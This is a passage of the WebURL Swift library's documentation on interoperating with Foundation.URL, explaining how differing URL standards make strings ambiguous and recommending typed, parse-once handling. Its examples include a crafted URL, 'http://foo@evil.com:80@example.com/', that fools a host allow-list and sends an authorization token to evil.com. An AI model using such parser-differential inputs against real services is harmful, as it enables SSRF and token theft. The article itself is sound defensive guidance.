{"identifier":{"interfaceLanguage":"swift","url":"doc:\/\/com.karwa.WebURL\/documentation\/WebURL\/FoundationInterop"},"hierarchy":{"paths":[["doc:\/\/com.karwa.WebURL\/documentation\/WebURL"]]},"variants":[{"paths":["\/documentation\/weburl\/foundationinterop"],"traits":[{"interfaceLanguage":"swift"}]}],"schemaVersion":{"minor":1,"patch":0,"major":0},"sections":[],"primaryContentSections":[{"kind":"content","content":[{"anchor":"Introduction","type":"heading","text":"Introduction","level":2},{"inlineContent":[{"type":"text","text":"The WebURL package comes with a number of APIs to support using "},{"type":"codeVoice","code":"WebURL"},{"type":"text","text":" with Foundation:"}],"type":"paragraph"},{"items":[{"content":[{"type":"paragraph","inlineContent":[{"type":"text","text":"Conversion initializers."}]},{"type":"paragraph","inlineContent":[{"type":"text","text":"Convert values between "},{"type":"codeVoice","code":"WebURL"},{"type":"text","text":" and "},{"type":"codeVoice","code":"Foundation.URL"},{"type":"text","text":" simply by constructing the type you need."},{"type":"text","text":" "},{"type":"text","text":"These initializers verify that both types have an equivalent interpretation of the URL value."}]},{"type":"codeListing","syntax":"swift","code":["let sourceURL = WebURL(\"https:\/\/api.example.com\/foo\/bar?baz\")!","","\/\/ WebURL -> Foundation.URL","let nsURL = URL(sourceURL)  \/\/ ✅ \"https:\/\/api.example.com\/foo\/bar?baz\"    ","\/\/ Foundation.URL -> WebURL","let webURL = WebURL(nsURL)  \/\/ ✅ \"https:\/\/api.example.com\/foo\/bar?baz\""]}]},{"content":[{"inlineContent":[{"text":"Convenience wrappers.","type":"text"}],"type":"paragraph"},{"inlineContent":[{"text":"Make requests using ","type":"text"},{"code":"URLSession","type":"codeVoice"},{"text":" directly from a ","type":"text"},{"code":"WebURL","type":"codeVoice"},{"text":" value, eliminating the conversion boilerplate.","type":"text"}],"type":"paragraph"},{"code":["\/\/ 😌 Make a URLSession request using a WebURL.","let webURL = WebURL(\"https:\/\/api.example.com\/foo\/bar?baz\")!","let dataTask = URLSession.shared.dataTask(with: webURL) { data, response, error in","  \/\/ ...","}","dataTask.resume()"],"syntax":"swift","type":"codeListing"}]}],"type":"orderedList"},{"content":[{"type":"paragraph","inlineContent":[{"type":"text","text":""},{"type":"text","text":" "},{"type":"text","text":"For these APIs to be available, you must import the "},{"type":"codeVoice","code":"WebURLFoundationExtras"},{"type":"text","text":" module:"}]},{"code":["import Foundation","import WebURL","import WebURLFoundationExtras  \/\/ <--"],"syntax":"swift","type":"codeListing"}],"type":"aside","style":"note"},{"inlineContent":[{"text":"This makes it easier to use ","type":"text"},{"code":"WebURL","type":"codeVoice"},{"text":" for more of your URL processing, while still supporting clients","type":"text"},{"text":" ","type":"text"},{"text":"or using libraries which require ","type":"text"},{"code":"Foundation.URL","type":"codeVoice"},{"text":".","type":"text"}],"type":"paragraph"},{"inlineContent":[{"text":"For many applications, this will “just work”. However, if you are developing a library which parses a URL string","type":"text"},{"text":" ","type":"text"},{"text":"(including from a JSON document or XPC message), there are some additional subtleties which you should be aware of.","type":"text"},{"text":" ","type":"text"},{"text":"These subtleties are, in fact, defects in URLs themselves; they happen in every programming language, with every","type":"text"},{"text":" ","type":"text"},{"text":"URL library, and can affect the security and robustness of your code.","type":"text"}],"type":"paragraph"},{"anchor":"URL-Strings-are-Ambiguous","type":"heading","text":"URL Strings are Ambiguous","level":2},{"inlineContent":[{"type":"text","text":"Almost all systems rely on URLs, often for vital operations such as making requests to remote services,"},{"type":"text","text":" "},{"type":"text","text":"processing requests from remote clients, locating files, determining who “owns” a particular resource, and more."},{"type":"text","text":" "},{"type":"text","text":"It may be surprising, then, to learn that "},{"type":"strong","inlineContent":[{"type":"text","text":"URL strings are ambiguous"}]},{"type":"text","text":"."}],"type":"paragraph"},{"inlineContent":[{"text":"URL standards have been revised many times over the decades, introducing subtle differences in how they are interpreted.","type":"text"},{"text":" ","type":"text"},{"text":"It is difficult to ensure that all code which processes a URL string interprets it in exactly the same way and","type":"text"},{"text":" ","type":"text"},{"text":"derives the same information from it - and that applies not only to networked clients, each of which might","type":"text"},{"text":" ","type":"text"},{"text":"use entirely different languages and libraries to process URLs, but also local applications.","type":"text"},{"text":" ","type":"text"},{"text":"Moreover, web browsers (typically one of the most important clients) have not been able to conform to any","type":"text"},{"text":" ","type":"text"},{"text":"historical standards due to compatibility constraints. There is a surprising amount of variety in how URL strings","type":"text"},{"text":" ","type":"text"},{"text":"can be interpreted, and sometimes they disagree with each other; and given how much we rely on URLs, that can lead","type":"text"},{"text":" ","type":"text"},{"text":"to unexpected behavior and even exploitable vulnerabilities.","type":"text"}],"type":"paragraph"},{"inlineContent":[{"type":"text","text":"This is the problem "},{"type":"codeVoice","code":"WebURL"},{"type":"text","text":" was created to help with; "},{"type":"codeVoice","code":"WebURL"},{"type":"text","text":" conforms to the latest industry standard,"},{"type":"text","text":" "},{"type":"text","text":"which formally defines URL parsing in a way that is compatible with the web platform. You should expect "},{"type":"codeVoice","code":"WebURL"},{"type":"text","text":" "},{"type":"text","text":"to work exactly as your browser does. There is even a shared test-suite which "},{"type":"codeVoice","code":"WebURL"},{"type":"text","text":", the major browsers,"},{"type":"text","text":" "},{"type":"text","text":"and other libraries all contribute to, which ensures that implementations do not diverge."}],"type":"paragraph"},{"inlineContent":[{"type":"text","text":"Since "},{"code":"Foundation.URL","type":"codeVoice"},{"type":"text","text":" conforms to an older standard that is "},{"type":"strong","inlineContent":[{"type":"text","text":"not"}]},{"type":"text","text":" web-compatible, parsing the same string"},{"type":"text","text":" "},{"type":"text","text":"with "},{"code":"WebURL","type":"codeVoice"},{"type":"text","text":" or "},{"code":"Foundation.URL","type":"codeVoice"},{"type":"text","text":" can expose some of those differences mentioned earlier. Consider the following:"}],"type":"paragraph"},{"code":["\/\/ What is the hostname of this URL?","let urlString = \"http:\/\/foo@evil.com:80@example.com\/\" ","","WebURL(urlString)!.hostname  \/\/ \"example.com\"","URL(string: urlString)!.host \/\/ \"evil.com\""],"type":"codeListing","syntax":"swift"},{"inlineContent":[{"type":"text","text":"Chrome, Safari, Firefox, Go, Python, NodeJS, and Rust all agree that this URL points to "},{"type":"codeVoice","code":"\"example.com\""},{"type":"text","text":"."},{"type":"text","text":" "},{"type":"text","text":"Try it - if you paste it in your browser, that’s where it will go. But since Foundation’s interpretation"},{"type":"text","text":" "},{"type":"text","text":"is based on an obsolete standard, it would send a request to "},{"type":"codeVoice","code":"\"evil.com\""},{"type":"text","text":" instead."}],"type":"paragraph"},{"inlineContent":[{"type":"text","text":"There are many subtle differences similar to this - after all, that is what it means for these types to implement"},{"type":"text","text":" "},{"type":"text","text":"different URL standards. This is the main way in which "},{"type":"codeVoice","code":"WebURL"},{"type":"text","text":" and "},{"type":"codeVoice","code":"Foundation.URL"},{"type":"text","text":" differ, and why you may"},{"type":"text","text":" "},{"type":"text","text":"wish to use "},{"type":"codeVoice","code":"WebURL"},{"type":"text","text":"’s web-compatible URL interpretation together with software that requires "},{"type":"codeVoice","code":"Foundation.URL"},{"type":"text","text":" values."}],"type":"paragraph"},{"content":[{"inlineContent":[{"type":"text","text":""}],"type":"paragraph"},{"inlineContent":[{"type":"text","text":"Using multiple URL standards safely requires a holistic understanding of how an application\/library treats URLs."},{"type":"text","text":" "},{"type":"text","text":"We propose the following guidelines, to be taken as best practices:"}],"type":"paragraph"},{"items":[{"content":[{"inlineContent":[{"text":"Store and communicate URLs using URL types. Avoid passing them around as strings.","type":"text"}],"type":"paragraph"}]},{"content":[{"type":"paragraph","inlineContent":[{"type":"text","text":"Each URL string should be interpreted by "},{"inlineContent":[{"type":"text","text":"only one"}],"type":"strong"},{"type":"text","text":" parser."}]}]},{"content":[{"inlineContent":[{"text":"If you must store or communicate a URL as a string (e.g. in JSON),","type":"text"},{"text":" ","type":"text"},{"text":"document which parser should be used to interpret it.","type":"text"}],"type":"paragraph"}]},{"content":[{"inlineContent":[{"text":"If no parser is explicitly specified, prefer ","type":"text"},{"code":"WebURL","type":"codeVoice"},{"text":" as the default.","type":"text"}],"type":"paragraph"}]}],"type":"unorderedList"},{"inlineContent":[{"type":"text","text":"The proliferation of URL standards is an issue that is being actively exploited, particularly by"},{"type":"text","text":" "},{"type":"text","text":"Server-Side Request Forgery (SSRF) vulnerabilities. The following sections discuss this advice in detail,"},{"type":"text","text":" "},{"type":"text","text":"including examples of exploits and how these practices could have avoided them."}],"type":"paragraph"}],"type":"aside","style":"important"},{"anchor":"URL-Types-are-Unambiguous","type":"heading","text":"URL Types are Unambiguous","level":2},{"inlineContent":[{"text":"The first guideline is to prefer storing and communicating URLs using URL types, rather than using strings.","type":"text"},{"text":" ","type":"text"},{"text":"Unlike a raw URL string, which can be ambiguous, values with a type such as ","type":"text"},{"code":"Foundation.URL","type":"codeVoice"},{"text":" or ","type":"text"},{"code":"WebURL","type":"codeVoice"},{"text":" communicate","type":"text"},{"text":" ","type":"text"},{"text":"precisely how they should be interpreted, and this enables conversion initializers to protect you from ambiguous URLs.","type":"text"}],"type":"paragraph"},{"inlineContent":[{"text":"For example, consider the demonstration URL from the previous section. Both ","type":"text"},{"code":"Foundation.URL","type":"codeVoice"},{"text":" and ","type":"text"},{"code":"WebURL","type":"codeVoice"},{"text":" can parse","type":"text"},{"text":" ","type":"text"},{"text":"the raw URL string, but see different components from it. But if we first parse the string as a ","type":"text"},{"code":"Foundation.URL","type":"codeVoice"},{"text":" value","type":"text"},{"text":" ","type":"text"},{"text":"and try to convert it to a ","type":"text"},{"code":"WebURL","type":"codeVoice"},{"text":", the conversion initializer will check that the source and destination types have","type":"text"},{"text":" ","type":"text"},{"text":"an equivalent interpretation of the URL. In this case, they don’t: ","type":"text"},{"code":"WebURL","type":"codeVoice"},{"text":" sees the hostname ","type":"text"},{"code":"\"example.com\"","type":"codeVoice"},{"text":",","type":"text"},{"text":" ","type":"text"},{"text":"but ","type":"text"},{"type":"codeVoice","code":"Foundation.URL"},{"type":"text","text":" sees "},{"type":"codeVoice","code":"\"evil.com\""},{"type":"text","text":", so the conversion fails."},{"type":"text","text":" "},{"type":"text","text":"This is a "},{"inlineContent":[{"type":"text","text":"much better outcome"}],"type":"strong"},{"type":"text","text":" than accidentally sending data to the wrong server!"}],"type":"paragraph"},{"code":["let urlString = \"http:\/\/foo@evil.com:80@example.com\/\" ","","let nsURL = URL(string: urlString)!","print(nsURL.host) \/\/ \"evil.com\"","WebURL(nsURL)     \/\/ ✅ nil - URL is ambiguous"],"type":"codeListing","syntax":"swift"},{"inlineContent":[{"text":"Something interesting happens if we try this conversion the other way around. Parsing a URL string with ","type":"text"},{"code":"WebURL","type":"codeVoice"},{"text":" ","type":"text"},{"text":"also normalizes it, so it helps to clean up ambiguous syntax and web-compatibility quirks.","type":"text"},{"text":" ","type":"text"},{"text":"This means that converting a ","type":"text"},{"code":"WebURL","type":"codeVoice"},{"text":" to a ","type":"text"},{"code":"Foundation.URL","type":"codeVoice"},{"text":" will almost always succeed.","type":"text"}],"type":"paragraph"},{"inlineContent":[{"text":"Considering the same URL string again, we see that ","type":"text"},{"type":"codeVoice","code":"WebURL"},{"text":" automatically percent-encodes a problematic","type":"text"},{"text":" ","type":"text"},{"type":"codeVoice","code":"\"@\""},{"text":" character, which cleans up the ambiguity about what the hostname is. Once ","type":"text"},{"type":"codeVoice","code":"WebURL"},{"text":" has normalized it,","type":"text"},{"text":" ","type":"text"},{"text":"there is no question that the URL string expresses a hostname of ","type":"text"},{"type":"codeVoice","code":"\"example.com\""},{"text":", so the conversion to ","type":"text"},{"type":"codeVoice","code":"Foundation.URL"},{"text":" ","type":"text"},{"text":"succeeds and the result agrees with browsers and other libraries.","type":"text"}],"type":"paragraph"},{"code":["let urlString = \"http:\/\/foo@evil.com:80@example.com\/\" ","","let webURL = WebURL(urlString)!","print(webURL.hostname)  \/\/ \"example.com\"","print(webURL)           \/\/ \"http:\/\/foo%40evil.com:80@example.com\/\"","\/\/                                    ^^^","\/\/               Problematic '@' sign has been encoded by WebURL,","\/\/                   resolving the ambiguity in favor of how","\/\/                       WebURL interprets this string.","","URL(webURL)?.host  \/\/ ✅ \"example.com\""],"type":"codeListing","syntax":"swift"},{"inlineContent":[{"text":"Successful conversion does ","type":"text"},{"type":"strong","inlineContent":[{"type":"text","text":"not"}]},{"text":" necessarily mean that the URLs have identical strings or components.","type":"text"},{"text":" ","type":"text"},{"text":"The conversion initializers are based on careful study of both standards, and permit certain normalization if the","type":"text"},{"text":" ","type":"text"},{"text":"result is a valid interpretation of the source value.","type":"text"}],"type":"paragraph"},{"inlineContent":[{"text":"In the following example, the standard used by ","type":"text"},{"code":"WebURL","type":"codeVoice"},{"text":" requires that the URL’s scheme and hostname be normalized","type":"text"},{"text":" ","type":"text"},{"text":"to lowercase. RFC-2396 (the standard used by ","type":"text"},{"code":"Foundation.URL","type":"codeVoice"},{"text":") says that this is allowed, so we consider that the","type":"text"},{"text":" ","type":"text"},{"text":"URL’s meaning is preserved and allow the conversion.","type":"text"}],"type":"paragraph"},{"code":["\/\/ Foundation's components:","let nsURL = URL(string: \"HTTP:\/\/EXAMPLE.COM\/\")!","print(nsURL)         \/\/ \"HTTP:\/\/EXAMPLE.COM\/\"","print(nsURL.scheme)  \/\/ \"HTTP\"","print(nsURL.host)    \/\/ \"EXAMPLE.COM\"","","\/\/ WebURL normalizes the URL, but the meaning is preserved:","let convertedURL = WebURL(nsURL)!","print(convertedURL)           \/\/ ✅ \"http:\/\/example.com\/\"","print(convertedURL.scheme)    \/\/ ✅ \"http\"","print(convertedURL.hostname)  \/\/ ✅ \"example.com\""],"type":"codeListing","syntax":"swift"},{"inlineContent":[{"type":"text","text":"This safe interoperability is only possible because we are converting URL types, rather than just parsing strings."},{"type":"text","text":" "},{"type":"text","text":"In the next section, we’ll discuss how important it is to apply this throughout an application at every level,"},{"type":"text","text":" "},{"type":"text","text":"so we always know how each URL should be interpreted."}],"type":"paragraph"},{"anchor":"Parse-Strings-Once","type":"heading","text":"Parse Strings Once","level":2},{"inlineContent":[{"type":"text","text":"Consider the following program, demonstrating a simple proxy server. It accepts a URL as input, and makes"},{"type":"text","text":" "},{"type":"text","text":"an authenticated request to it (including some private token) - of course, before making the request,"},{"type":"text","text":" "},{"type":"text","text":"the target must be verified to ensure that the proxy only discloses its tokens to servers that are allowed to see them."}],"type":"paragraph"},{"inlineContent":[{"text":"The implementation is split in to two functions - one function checks that the URL points to an approved server,","type":"text"},{"text":" ","type":"text"},{"text":"and the other which makes the authenticated HTTP request. Both functions accept URL parameters using strings:","type":"text"}],"type":"paragraph"},{"inlineContent":[{"inlineContent":[{"text":"Application:","type":"text"}],"type":"strong"}],"type":"paragraph"},{"code":["func checkHostAndMakeRequest(_ urlString: String) throws -> URLSessionDataTask {","  \/\/ 1. Verify host.","  guard checkHostIsAllowed(urlString) else { ","    throw MyAppError.hostIsNotAllowed","  }","  \/\/ 2. Make request.","  return try makeAuthenticatedRequest(urlString, completionHandler: ...)","}"],"type":"codeListing","syntax":"swift"},{"inlineContent":[{"inlineContent":[{"type":"text","text":"Allow-List Checker:"}],"type":"strong"}],"type":"paragraph"},{"code":["let allowedHosts: Set<String> = [ \"example.com\", \/* ... *\/ ]","","\/\/ ⚠️                                vvvvvv","func checkHostIsAllowed(_ urlString: String) -> Bool {","  if let hostname = WebURL(urlString)?.hostname {","    return allowedHosts.contains(hostname)","  }","  return false","}"],"type":"codeListing","syntax":"swift"},{"inlineContent":[{"inlineContent":[{"text":"Request Engine:","type":"text"}],"type":"strong"}],"type":"paragraph"},{"code":["\/\/ ⚠️                                      vvvvvv","func makeAuthenticatedRequest(_ urlString: String, completionHandler: <...>) throws -> URLSessionDataTask {","  guard let url = Foundation.URL(string: urlString) else {","    throw MyLibraryError.invalidURL","  }","  var request = URLRequest(url: url)","  request.allHTTPHeaderFields = [\"Authorization\" : \"Bearer <...>\"]","  return URLSession.shared.dataTask(with: request, completionHandler: completionHandler)","}"],"type":"codeListing","syntax":"swift"},{"inlineContent":[{"type":"text","text":"Each of these functions may look reasonable in isolation, but the effect of combining them is that a single URL string"},{"type":"text","text":" "},{"type":"text","text":"is parsed twice, each time by a different parser, and possibly with inconsistent results. In other words,"},{"type":"text","text":" "},{"type":"text","text":"the hostname verified by "},{"type":"codeVoice","code":"checkHostIsAllowed"},{"type":"text","text":" might "},{"type":"emphasis","inlineContent":[{"text":"not","type":"text"}]},{"type":"text","text":" be the host that "},{"type":"codeVoice","code":"makeAuthenticatedRequest"},{"type":"text","text":" actually"},{"type":"text","text":" "},{"type":"text","text":"makes a request to!"}],"type":"paragraph"},{"inlineContent":[{"type":"text","text":"A maliciously-crafted URL could exploit this difference to leak authentication tokens to the attacker’s own server;"},{"type":"text","text":" "},{"type":"text","text":"indeed, a "},{"type":"reference","identifier":"https:\/\/bugs.xdavidhu.me\/google\/2021\/12\/31\/fixing-the-unfixable-story-of-a-google-cloud-ssrf\/","isActive":true},{"type":"text","text":" used a similar technique with just such a proxy in order to"},{"type":"text","text":" "},{"type":"text","text":"gain unauthorized access to some internal Google Cloud Platform accounts. This is a good demonstration of how"},{"type":"text","text":" "},{"type":"text","text":"the proliferation of URL standards leads to security vulnerabilities today, even outside of the Swift ecosystem."}],"type":"paragraph"},{"code":["\/\/ The call:","let task = try checkHostAndMakeRequest(\"http:\/\/foo@evil.com:80@example.com\/\")","","\/\/ What happens:","func checkHostAndMakeRequest(_ urlString: String) throws -> URLSessionDataTask {","","  \/\/ ⚠️ 'checkHostIsAllowed' parses the string using WebURL,","  \/\/     so it thinks the host is 'example.com'.","  guard checkHostIsAllowed(urlString) else { ","    throw MyAppError.hostIsNotAllowed","  }","  \/\/ ⚠️ But the request function parses the string using Foundation.URL,","  \/\/    so it actually makes the request to 'evil.com' and leaks our token!","  return try makeAuthenticatedRequest(urlString, completionHandler: ...)","}"],"type":"codeListing","syntax":"swift"},{"inlineContent":[{"type":"text","text":"It can be difficult to spot these sorts of issues: for instance, these functions may live in separate libraries"},{"type":"text","text":" "},{"type":"text","text":"and you may not have access to their source code, or the URL string might not be a simple parameter, but instead"},{"type":"text","text":" "},{"type":"text","text":"part of a JSON document or XPC message. The common feature is that URLs are communicated without using a URL type,"},{"type":"text","text":" "},{"type":"text","text":"so it is difficult to ensure that all parts of the program\/distributed system interpret them consistently."}],"type":"paragraph"},{"inlineContent":[{"type":"text","text":"For function calls and other, more straightforward examples of this bug, switching to URL types can help."},{"type":"text","text":" "},{"type":"text","text":"This effectively hoists URL parsing out of the leaf functions and moves it closer to the source of the string."},{"type":"text","text":" "},{"type":"text","text":"Generally, you should aim to parse each URL string "},{"type":"strong","inlineContent":[{"type":"text","text":"once"}]},{"type":"text","text":" and only once, and only using one parser."},{"type":"text","text":" "},{"type":"text","text":"After parsing, the URL can be safely converted between "},{"type":"codeVoice","code":"WebURL"},{"type":"text","text":" and "},{"type":"codeVoice","code":"Foundation.URL"},{"type":"text","text":" as many times as needed"},{"type":"text","text":" "},{"type":"text","text":"using the conversion initializers."}],"type":"paragraph"},{"inlineContent":[{"type":"text","text":"We can fix the above example by hoisting URL parsing out of "},{"code":"checkHostIsAllowed","type":"codeVoice"},{"type":"text","text":" and "},{"code":"makeAuthenticatedRequest","type":"codeVoice"},{"type":"text","text":","},{"type":"text","text":" "},{"type":"text","text":"and moving it in to their shared caller, "},{"code":"checkHostAndMakeRequest","type":"codeVoice"},{"type":"text","text":". We decide to parse using "},{"code":"WebURL","type":"codeVoice"},{"type":"text","text":","},{"type":"text","text":" "},{"type":"text","text":"but "},{"code":"makeAuthenticatedRequest","type":"codeVoice"},{"type":"text","text":" safely converts that to a "},{"code":"Foundation.URL","type":"codeVoice"},{"type":"text","text":" in order to make the request"},{"type":"text","text":" "},{"type":"text","text":"using "},{"code":"URLSession","type":"codeVoice"},{"type":"text","text":"."}],"type":"paragraph"},{"inlineContent":[{"type":"strong","inlineContent":[{"text":"Fixed Allow-List Checker and Request Engine:","type":"text"}]}],"type":"paragraph"},{"code":["\/\/ ✅                          vvvvvv","func checkHostIsAllowed(_ url: WebURL) -> Bool {","  if let hostname = url.hostname {","    return allowedHosts.contains(hostname)","  }","  return false","}","","\/\/ ✅                                vvvvvv","func makeAuthenticatedRequest(_ url: WebURL, completionHandler: <...>) throws -> URLSessionDataTask {","  \/\/ ✅ WebURL -> Foundation.URL conversion preserves meaning.","  guard let convertedURL = Foundation.URL(url) else {","    throw MyLibraryError.invalidURL","  }","  var request = URLRequest(url: convertedURL)","  request.allHTTPHeaderFields = [\"Authorization\" : \"Bearer <...>\"]","  return URLSession.shared.dataTask(with: request, completionHandler: completionHandler)","}"],"type":"codeListing","syntax":"swift"},{"content":[{"type":"paragraph","inlineContent":[{"type":"text","text":""}]},{"type":"paragraph","inlineContent":[{"text":"We’re showing the explicit ","type":"text"},{"code":"WebURL -> Foundation.URL","type":"codeVoice"},{"text":" conversions for the sake of clarity, but you can also","type":"text"},{"text":" ","type":"text"},{"text":"create a ","type":"text"},{"code":"URLRequest","type":"codeVoice"},{"text":" directly from a ","type":"text"},{"code":"WebURL","type":"codeVoice"},{"text":". It will do the same, safe conversion behind the scenes.","type":"text"}]},{"type":"codeListing","code":["func makeAuthenticatedRequest(_ url: WebURL, completionHandler: <...>) throws -> URLSessionDataTask {","  \/\/ ✅ Create URLRequest directly from a WebURL","  var request = URLRequest(url: url)","  request.allHTTPHeaderFields = [\"Authorization\" : \"Bearer <...>\"]","  return URLSession.shared.dataTask(with: request, completionHandler: completionHandler)","}"],"syntax":"swift"}],"type":"aside","style":"tip"},{"inlineContent":[{"type":"text","text":"Now that these leaf functions no longer parse URL strings, we don’t need to worry about them using different parsers."},{"type":"text","text":" "},{"type":"text","text":"URL string parsing now happens once, in the caller:"}],"type":"paragraph"},{"code":["\/\/ The call:","let task = try checkHostAndMakeRequest(\"http:\/\/foo@evil.com:80@example.com\/\")","","\/\/ What happens:","func checkHostAndMakeRequest(_ urlString: String) throws -> URLSessionDataTask {","","  \/\/ ✅ The string is only parsed once.","  \/\/    Note: best practice would be to hoist this as well :)","  guard let url = WebURL(urlString) else {","    throw MyAppError.invalidURL","  }","  \/\/ ✅ 'checkHostIsAllowed' reads the host as 'example.com'.","  guard checkHostIsAllowed(url) else { ","    throw MyAppError.hostIsNotAllowed","  }","  \/\/ ✅ Typed conversion ensures the request is really made to 'example.com' ","  return try makeAuthenticatedRequest(url, completionHandler: ...)","}"],"type":"codeListing","syntax":"swift"},{"inlineContent":[{"text":"For the sake of making this example easier to follow, we’re only showing one level of hoisting, but best practice","type":"text"},{"text":" ","type":"text"},{"text":"would be to hoist URL parsing once again, out of ","type":"text"},{"type":"codeVoice","code":"checkHostAndMakeRequest"},{"text":" and in to its own caller. If we apply that","type":"text"},{"text":" ","type":"text"},{"text":"hoisting as many times as we can, we can prevent that URL floating around the application as a raw string.","type":"text"}],"type":"paragraph"},{"inlineContent":[{"text":"As we’ve seen, it can be difficult to ensure that URLs are always interpreted consistently, especially across","type":"text"},{"text":" ","type":"text"},{"text":"large applications using lots of third-party libraries. For function calls and other situations where Swift’s","type":"text"},{"text":" ","type":"text"},{"text":"type system is available, we ","type":"text"},{"inlineContent":[{"type":"text","text":"strongly recommend"}],"type":"strong"},{"text":" that you use typed URL values and the conversion initializers","type":"text"},{"text":" ","type":"text"},{"text":"provided by ","type":"text"},{"code":"WebURLFoundationExtras","type":"codeVoice"},{"text":". For other situations, such as URLs communicated via JSON documents","type":"text"},{"text":" ","type":"text"},{"text":"or XPC messages, we also very much recommend documenting which parser or standard is required to interpret them,","type":"text"},{"text":" ","type":"text"},{"text":"and ensuring that is used consistently.","type":"text"}],"type":"paragraph"},{"anchor":"Prefer-Parsing-Using-WebURL","type":"heading","text":"Prefer Parsing Using WebURL","level":2},{"inlineContent":[{"type":"text","text":"We’ve discussed the importance of parsing raw URL strings in to typed URL values as early as possible,"},{"type":"text","text":" "},{"type":"text","text":"and that you should rely on type conversions to move between the different standards. But which URL parser"},{"type":"text","text":" "},{"type":"text","text":"should you use for that initial step?"}],"type":"paragraph"},{"inlineContent":[{"type":"text","text":"Firstly, if it is explicitly specified which parser to use for a URL string, "},{"type":"strong","inlineContent":[{"type":"text","text":"use that parser"}]},{"type":"text","text":"."},{"type":"text","text":" "},{"type":"text","text":"If it is not specified, then matching a web browser is typically a good choice, and probably a more reasonable choice"},{"type":"text","text":" "},{"type":"text","text":"than the standard used by "},{"type":"codeVoice","code":"Foundation.URL"},{"type":"text","text":", which as mentioned previously has been officially obsolete for some time."}],"type":"paragraph"},{"inlineContent":[{"text":"Using ","type":"text"},{"code":"WebURL","type":"codeVoice"},{"text":" for parsing and URL manipulation comes with a lot of additional benefits:","type":"text"}],"type":"paragraph"},{"items":[{"content":[{"type":"paragraph","inlineContent":[{"type":"text","text":"🌍 It’s web-compatible."}]},{"type":"paragraph","inlineContent":[{"type":"text","text":"Actors on the web platform need to use a web-compatible parser to interpret URLs."},{"type":"text","text":" "},{"type":"codeVoice","code":"Foundation.URL"},{"type":"text","text":" is simply not web-compatible. It’s a simple point, but it is quite compelling."}]}]},{"content":[{"inlineContent":[{"text":"🔩 It’s always normalized.","type":"text"}],"type":"paragraph"},{"inlineContent":[{"type":"text","text":"Parsing a string using "},{"type":"codeVoice","code":"WebURL"},{"type":"text","text":" cleans up many ambiguous or ill-formatted URLs automatically, according to its"},{"type":"text","text":" "},{"type":"text","text":"interpretation of the contents. That means "},{"type":"codeVoice","code":"WebURL"},{"type":"text","text":" is easier to work with, and produces URL strings which"},{"type":"text","text":" "},{"type":"text","text":"are more interoperable with other libraries and systems. They can even be converted to "},{"type":"codeVoice","code":"Foundation.URL"},{"type":"text","text":" values"},{"type":"text","text":" "},{"type":"text","text":"even in situations where the reverse order of operations would be ambiguous."}],"type":"paragraph"},{"type":"aside","content":[{"type":"paragraph","inlineContent":[{"type":"text","text":""}]},{"type":"paragraph","inlineContent":[{"type":"text","text":"Every single "},{"type":"codeVoice","code":"WebURL"},{"type":"text","text":" API ensures the URL is kept normalized - whether you’re inserting path components"},{"type":"text","text":" "},{"type":"text","text":"or query parameters via the "},{"type":"reference","isActive":true,"identifier":"doc:\/\/com.karwa.WebURL\/documentation\/WebURL\/WebURL\/pathComponents-swift.property"},{"type":"text","text":" or "},{"type":"reference","isActive":true,"identifier":"doc:\/\/com.karwa.WebURL\/documentation\/WebURL\/WebURL\/formParams"},{"type":"text","text":" views,"},{"type":"text","text":" "},{"type":"text","text":"or setting entire URL components via properties or the "},{"type":"reference","isActive":true,"identifier":"doc:\/\/com.karwa.WebURL\/documentation\/WebURL\/WebURL\/utf8"},{"type":"text","text":" view."}]},{"type":"paragraph","inlineContent":[{"type":"text","text":"There is no "},{"code":".standardize()","type":"codeVoice"},{"type":"text","text":" or "},{"code":".normalize()","type":"codeVoice"},{"type":"text","text":" function in "},{"code":"WebURL","type":"codeVoice"},{"type":"text","text":" - it just always is."}]}],"style":"tip"}]},{"content":[{"inlineContent":[{"text":"😌 It’s easier to use (and to use correctly).","type":"text"}],"type":"paragraph"},{"inlineContent":[{"code":"WebURL","type":"codeVoice"},{"text":"‘s ","type":"text"},{"code":".pathComponents","type":"codeVoice"},{"text":" and ","type":"text"},{"code":".formParams","type":"codeVoice"},{"text":" views give you simple and efficient ways to read\/write the URL’s","type":"text"},{"text":" ","type":"text"},{"text":"path and query. There’s no awkward ","type":"text"},{"code":"URLComponents","type":"codeVoice"},{"text":"-like type to convert to - it all just works, directly.","type":"text"}],"type":"paragraph"},{"inlineContent":[{"type":"text","text":"If you’re on an Apple platform and need to make requests using "},{"code":"URLSession","type":"codeVoice"},{"type":"text","text":", you can totally do that!"},{"type":"text","text":" "},{"type":"text","text":"And if you need to interoperate with code that still uses the legacy "},{"code":"Foundation.URL","type":"codeVoice"},{"type":"text","text":", you can do that, too!"}],"type":"paragraph"},{"inlineContent":[{"type":"text","text":"So once you parse a string using "},{"type":"codeVoice","code":"WebURL"},{"type":"text","text":", why not just keep like that?"},{"type":"text","text":" "},{"type":"text","text":"Take advantage of "},{"type":"codeVoice","code":"WebURL"},{"type":"text","text":"’s great API as far as you can, and convert only when you really need to."}],"type":"paragraph"}]},{"content":[{"type":"paragraph","inlineContent":[{"text":"📊 It’s ","type":"text"},{"type":"emphasis","inlineContent":[{"type":"text","text":"really"}]},{"text":" well tested.","type":"text"}]},{"type":"paragraph","inlineContent":[{"code":"WebURL","type":"codeVoice"},{"type":"text","text":" is extensively tested by the Web Platform Tests. This is a shared test database used by the major browsers,"},{"type":"text","text":" "},{"code":"WebURL","type":"codeVoice"},{"type":"text","text":", and other implementations of the standard; we pool our implementation experience to ensure that"},{"type":"text","text":" "},{"type":"text","text":"any ambiguities or divergent behavior are eliminated. Since "},{"code":"WebURL","type":"codeVoice"},{"type":"text","text":"’s parser is highly customized and tuned"},{"type":"text","text":" "},{"type":"text","text":"for performance, we discovered a number of gaps in its coverage and made significant contributions to improve it -"},{"type":"text","text":" "},{"type":"text","text":"often exposing browser bugs that were subsequently fixed. This whole process is an incredibly valuable and positive"},{"type":"text","text":" "},{"type":"text","text":"cycle, and helps give you confidence that all implementations are reliable and work the same way."}]},{"type":"paragraph","inlineContent":[{"type":"text","text":"Unfortunately, "},{"code":"Foundation.URL","type":"codeVoice"},{"type":"text","text":" simply cannot participate in that process, or anything like it."},{"type":"text","text":" "},{"type":"text","text":"Nobody’s writing new implementations of the obsolete RFC-2396."}]},{"type":"paragraph","inlineContent":[{"text":"Testing has been a major focus of ","type":"text"},{"type":"codeVoice","code":"WebURL"},{"text":" since the beginning. In addition to the Web Platform Tests database","type":"text"},{"text":" ","type":"text"},{"text":"(which by itself is over 3x as large as Foundation’s database), WebURL is supplemented by 